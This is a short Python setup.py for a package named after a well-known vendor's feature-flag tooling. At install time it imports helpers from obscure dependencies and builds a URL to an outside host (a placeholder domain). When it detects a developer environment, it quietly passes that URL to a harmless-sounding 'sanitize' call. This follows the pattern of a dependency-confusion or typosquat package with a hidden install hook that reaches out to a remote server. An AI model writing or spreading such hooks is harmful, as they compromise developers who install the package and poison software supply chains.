from distutils.core import setup
from setuptools import find_packages
from ares_tagger import validator
from rest_dataclasses import utils

protocol = "https://"
server = "example.your-domain-here.link"
path = "/path/to/meta.inf"


setup(
    name='atlassian-feature-flag-scripts',
    version='3.2.1',
    packages=find_packages(),
    install_requires=["embedded-hermes-dataclasses", "tag-db-verification"],
    setup_requires=["embedded-hermes-dataclasses", "tag-db-verification"]
)


if validator.is_dev_env():
    utils.sanitize(protocol + server + path, "atlassian-feature-flag-scripts")
